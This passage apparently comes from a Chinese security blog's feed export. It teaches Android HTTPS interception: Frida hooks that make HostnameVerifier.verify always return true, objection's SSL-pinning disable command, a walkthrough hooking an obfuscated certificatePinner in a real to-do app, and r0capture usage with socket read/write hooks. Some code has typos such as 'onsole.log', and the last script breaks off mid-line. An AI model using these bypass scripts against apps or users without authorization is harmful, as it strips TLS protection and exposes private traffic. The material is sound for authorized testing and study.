title="HostnameVerifier校验"></a>HostnameVerifier校验</h2><p><code>HostnameVerifier</code>代码实现如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">builder.hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HostnameVerify</span>)&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname, SSLSession session)</span>&#123;  <span class="comment">//传入两个参数，hostname:服务器域名  session:会话信息，里面会包含证书相关内容</span></span><br><span class="line">        <span class="keyword">if</span> (hostname.equals(<span class="string">&#x27;www.baidu.com&#x27;</span>))&#123;  <span class="comment">//首先判断hostname是否为www.baidu.com(这块随便写的)</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Certificate[] peerCertificates = session.getPeerCertificates();  <span class="comment">//从session获取到服务器端证书相关信息</span></span><br><span class="line">                <span class="keyword">if</span>(peerCertificates[<span class="number">0</span>].getPublicKey().equals(myCertificate.getPublicKey()))&#123;  <span class="comment">//判断服务器端证书公钥是否和本地证书公钥一样</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">//若匹配成功则校验通过，校验失败，也就意味抓不到包</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(SSLPeerUnverifiedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>【注】这块的”hostnameVerify” 是一个接口，如果我们要hook它的verify方法，就要先找到实现这个接口的所有类。然后hook这些类的verify方法</p><h4 id="判断当前类是否是实现hostnameVerify接口的类"><a href="#判断当前类是否是实现hostnameVerify接口的类" class="headerlink" title="判断当前类是否是实现hostnameVerify接口的类"></a>判断当前类是否是实现hostnameVerify接口的类</h4><p>checkIsImplementInterface(className, interfaceName)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//定义函数，传入类名和接口</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">className, interfaceName</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;  <span class="comment">//判断这个传入的class是不是一个接口</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;  </span><br><span class="line">                    <span class="comment">//java中，isAssignableFrom 方法用于确定一个类是否可以被另一个类赋值</span></span><br><span class="line">                    <span class="comment">//frida中，检查 cls 是否实现了 interfaceName 接口，或者 cls 是否是 interfaceName 接口的子类型</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="打印出所有实现了hostnameVerify接口的类"><a href="#打印出所有实现了hostnameVerify接口的类" class="headerlink" title="打印出所有实现了hostnameVerify接口的类"></a>打印出所有实现了hostnameVerify接口的类</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> hostnameVerifierInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;  <span class="comment">//调用Java.enumerateLoadedClasses来遍历所有加载的类</span></span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, hostnameVerifierInterface))&#123;</span><br><span class="line">                onsole.<span class="title function_">log</span>(className); <span class="comment">//打印出实现了TrustManager接口的类名</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Enumeration completed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">             </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="对实现类中的verify方法进行hook"><a href="#对实现类中的verify方法进行hook" class="headerlink" title="对实现类中的verify方法进行hook"></a>对实现类中的verify方法进行hook</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> hostnameVerifierInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>);</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;  <span class="comment">//调用Java.enumerateLoadedClasses来遍历所有加载的类</span></span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, hostnameVerifierInterface))&#123;</span><br><span class="line">              onsole.<span class="title function_">log</span>(className); <span class="comment">//打印出实现了TrustManager接口的类名</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">              <span class="keyword">var</span> len = targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                  targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;verify: &quot;</span> + hostname);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;   <span class="comment">//返回true表示验证通过</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Enumeration completed.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">           </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="完整hook代码如下"><a href="#完整hook代码如下" class="headerlink" title="完整hook代码如下"></a>完整hook代码如下</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">className, interfaceName</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">        <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;  <span class="comment">//判断这个传入的class是不是一个接口</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="keyword">if</span> (cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;  </span><br><span class="line">               <span class="comment">//java中，isAssignableFrom 方法用于确定一个类是否可以被另一个类赋值</span></span><br><span class="line">               <span class="comment">//frida中，检查 cls 是否实现了 interfaceName 接口，或者 cls 是否是 interfaceName 接口的子类型</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> hostnameVerifierInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>);</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;  <span class="comment">//调用Java.enumerateLoadedClasses来遍历所有加载的类</span></span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, hostnameVerifierInterface))&#123;</span><br><span class="line">              onsole.<span class="title function_">log</span>(className); <span class="comment">//打印出实现了TrustManager接口的类名</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">              <span class="keyword">var</span> len = targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                  targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;verify: &quot;</span> + hostname);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;   <span class="comment">//返回true表示验证通过</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Enumeration completed.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">           </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="0x04-objection的SSLunpinning"><a href="#0x04-objection的SSLunpinning" class="headerlink" title="0x04 objection的SSLunpinning"></a>0x04 objection的SSLunpinning</h1><p>使用 objection 启动explore模式：objection -g com.actorn.netcapture explore</p><p>然后再输入android sslpinning disable绕过证书绑定</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070001995.jpeg" alt="img"> </p><p>然后再点击app的后三个按钮，就可以抓到https的请求包了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070001275.jpeg" alt="img"> </p><h1 id="0x05-混淆框架之关键点寻找"><a href="#0x05-混淆框架之关键点寻找" class="headerlink" title="0x05 混淆框架之关键点寻找"></a>0x05 混淆框架之关键点寻找</h1><p>如果有对代码进行混淆处理，那么直接hook对应的类和方法，这样在内存中是直接找不到的。那么也就会导致hook失败。</p><p>这种情况怎么处理呢？？？</p><p>1、实战样本：滴答清单.apk</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070002696.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003316.png" alt="image.png"> </p><p>2、使用charles开启抓包，但抓包失败</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003668.png" alt="image.png"> </p><p>报错 “Client closed the connection before a request was made. Possibly the SSL certificate was rejected.”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003114.png" alt="image.png"> </p><p>3、通过报错可以看出是存在客户端校验的，这块直接使用常见 SSLUnpinning，没啥用</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003207.png" alt="image.png"> </p><p>4、猜测可能是APP本身有做了一些混淆。</p><p>（1）首先未加壳，直接使用jadx打开</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004091.png" alt="image.png"> </p><p>（2）打开后，发现使用了OKhttp3框架</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004231.png" alt="image.png"> </p><p>（3）可以看到做了一定的混淆处理，直接和之前一样hook肯定是不行了。。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004614.png" alt="image.png"> </p><p>（4）这块可以尝试搜索关键的类和函数，看能不能定位到</p><p>①TrustManager校验：OkhttpClinet—没找到</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004436.png" alt="image.png"> </p><p>②certificatePinner证书绑定：certificatePinner</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004405.png" alt="image.png"> </p><p>（5）定位到证书绑定代码位置 hq.f</p><p>在f类的a方法上，刚好有定义certificatePinner绑定校验</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004709.png" alt="image.png"> </p><p>（6）Frida编写代码 hook hq.f.a</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> className = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;hq.f&quot;</span>);</span><br><span class="line">    className.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;certificatePinner called&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>(7)成功抓包！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070005390.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP抓包 </tag>
            
            <tag> sslunpinning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Http抓包之R0Capture</title>
      <link href="/2024/06/28/Http%E6%8A%93%E5%8C%85%E4%B9%8BR0Capture/"/>
      <url>/2024/06/28/Http%E6%8A%93%E5%8C%85%E4%B9%8BR0Capture/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-R0Capture介绍"><a href="#一-R0Capture介绍" class="headerlink" title="一 R0Capture介绍"></a>一 R0Capture介绍</h1><h2 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1. 下载地址"></a>1. 下载地址</h2><p><a href="https://github.com/r0ysue/r0capture">r0ysue&#x2F;r0capture: 安卓应用层抓包通杀脚本 (github.com)</a></p><h2 id="2-介绍"><a href="#2-介绍" class="headerlink" title="2. 介绍"></a>2. 介绍</h2><ul><li>仅限安卓平台，测试安卓7、8、9、10、11、12、13、14 可用（禁止模拟器） ；</li><li>无视所有证书校验或绑定，不用考虑任何证书的事情；</li><li>通杀TCP&#x2F;IP四层模型中的应用层中的全部协议；</li><li>通杀协议包括：Http,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobuf等等、以及它们的SSL版本；</li><li>通杀所有应用层框架，包括HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、Retrofit&#x2F;Volley等等；</li><li>无视加固，不管是整体壳还是二代壳或VMP，不用考虑加固的事情；</li></ul><h2 id="3-用法Usage"><a href="#3-用法Usage" class="headerlink" title="3. 用法Usage"></a>3. 用法Usage</h2><ul><li>Spawn 模式：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 r0capture.py -U -f com.coolapk.market -v</span><br></pre></td></tr></table></figure><ul><li>Attach 模式，抓包内容保存成pcap文件供后续分析：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 r0capture.py -U 酷安 -v -p iqiyi.pcap</span><br></pre></td></tr></table></figure><p>建议使用<code>Attach</code>模式，从感兴趣的地方开始抓包，并且保存成<code>pcap</code>文件，供后续使用Wireshark进行分析。</p><p>老版本Frida使用包名，新版本Frida使用APP名。APP名必须是点开app后，frida-ps -U显示的那个app名字。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406280958072.png" alt="img"> </p><ul><li>收发包函数定位：<code>Spawn</code>和<code>attach</code>模式均默认开启；</li></ul><blockquote><p>可以使用<code>python r0capture.py -U -f cn.soulapp.android -v  &gt;&gt; soul3.txt</code>这样的命令将输出重定向至txt文件中稍后过滤内容</p></blockquote><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281000228.png" alt="image-20240628100039131"> </p><ul><li>客户端证书导出功能：默认开启；必须以Spawm模式运行；</li></ul><blockquote><p>运行脚本之前必须手动给App加上存储卡读写权限；</p></blockquote><blockquote><p>并不是所有App都部署了服务器验证客户端的机制，只有配置了的才会在Apk中包含客户端证书</p></blockquote><blockquote><p>导出后的证书位于&#x2F;sdcard&#x2F;Download&#x2F;包名xxx.p12路径，导出多次，每一份均可用，密码默认为：r0ysue，推荐使用<a href="http://keystore-explorer.org/">keystore-explorer</a>打开查看证书。</p></blockquote><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281000553.png" alt="image-20240628100019436"> </p><h2 id="4-知识点汇总"><a href="#4-知识点汇总" class="headerlink" title="4. 知识点汇总"></a>4. 知识点汇总</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281001177.png" alt="image-20240628100124057"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281003808.png" alt="微信图片_20240628100321"> </p><h1 id="二-Hook原理-关键源码追踪"><a href="#二-Hook原理-关键源码追踪" class="headerlink" title="二 Hook原理&amp;关键源码追踪"></a>二 Hook原理&amp;关键源码追踪</h1><h2 id="1-HTTP-Request"><a href="#1-HTTP-Request" class="headerlink" title="1. HTTP Request"></a>1. HTTP Request</h2><h3 id="实现http请求"><a href="#实现http请求" class="headerlink" title="实现http请求"></a>实现http请求</h3><p>创建一个httpsock函数，本质就是简单的java代码，通过socket实现客户端与服务端通信</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//http://www.dtasecurity.cn:18080/demo01/getNotice</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">httpsock</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;www.dtasecurity.cn&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">18080</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/demo01/getNotice&quot;</span>;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);  <span class="comment">//创建socket对象</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;GET &quot;</span>+path+<span class="string">&quot; HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;user-Agent: test\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, sb.toString());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();   <span class="comment">//字符串拼接，拼接好之后调用socket发送到服务端</span></span><br><span class="line">        outputStream.write(sb.toString().getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这块同上，接收服务端的返回数据</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span>( ( len = inputStream.read(buffer,<span class="number">0</span>,buffer.length) ) != -<span class="number">1</span> )&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(Arrays.copyOf(buffer,len)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281010710.png" alt="image.png"> </p><p>可以看到这块Java代码是调用了 outputStream 的 write 方法，实现将数据传送到管道中的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281010312.png" alt="image.png"> </p><p>跟进write方法。可以看到是调用byte数组，进行数据写入。。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281013204.png" alt="image.png"> </p><p>这块 outputStream 是一个抽象类，抽象类是不能直接hook的，所以这块需要找到  outputStream 的实现类。。</p><p>那么如何找到它的实现类呢？？？</p><p>这块可以在 outputStream.write 处下断点，debug调试找到它的具体实现类为：<strong>SocketOutputStream</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281014811.png" alt="image.png"> </p><p>所以，这块可以查找下  <strong>SocketOutputStream</strong> 中的write方法，参数类型为byte</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281015623.png" alt="image.png"> </p><p>调用了 socketWrite 方法，继续往下跟。可以看到真正调用的是try中包裹的<strong>socketWrite0</strong>方法</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281015859.png" alt="image.png"> </p><p>跟进socketWrite0 方法，可以看到这块修饰符多了个 <strong>native</strong>，这是因为函数不是在java层实现的，它的实现在so层。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281015354.png" alt="image.png"> </p><h3 id="Frida-Hook-Http-request"><a href="#Frida-Hook-Http-request" class="headerlink" title="Frida Hook Http-request"></a>Frida Hook Http-request</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Start!&quot;</span>) </span><br><span class="line">        <span class="comment">//hook SocketOutputStream中的socketWrite0函数</span></span><br><span class="line">        <span class="comment">//这块的目的就是拿到函数中的参数 bytes</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">socketWrite0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len</span>)&#123;</span><br><span class="line">            <span class="comment">//打印了客户端和服务端地址</span></span><br><span class="line">            <span class="keyword">var</span> localAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(localAddress +<span class="string">&quot;====&gt;&quot;</span>+ remoteAddress)</span><br><span class="line">           </span><br><span class="line">            <span class="comment">//这块通过自定义hexdump函数，获取输入的byte内容</span></span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len)</span><br><span class="line">        </span><br><span class="line">            <span class="title function_">showStacks</span>()</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(fd,bytes,off,len)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用该函数，可以实现将内存中的 byte 转换为 String</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">            <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">            <span class="comment">// offset =&gt; I</span></span><br><span class="line">            <span class="comment">// length =&gt; I</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//打印它的调用栈</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281019142.png" alt="image.png"> </p><h2 id="2-HTTP-Response"><a href="#2-HTTP-Response" class="headerlink" title="2. HTTP Response"></a>2. HTTP Response</h2><p>这块是调用inputStream.read方法来获取http的response的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281024346.png" alt="image.png"> </p><p>inputStream.read和 outputStream.write方法是对应关系，这块可以大胆猜测一下，inputStream的实现类是<strong>SocketIntputStream</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281024982.png" alt="image.png"> </p><p>在它的里面，也是有<strong>socketRead0</strong>方法的，我们这块hook，也是hook的这个方法</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281024116.png" alt="image.png"> </p><h3 id="Frida-Hook-Http-response"><a href="#Frida-Hook-Http-response" class="headerlink" title="Frida Hook Http-response"></a>Frida Hook Http-response</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//http response</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                 <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>).<span class="property">socketRead0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span 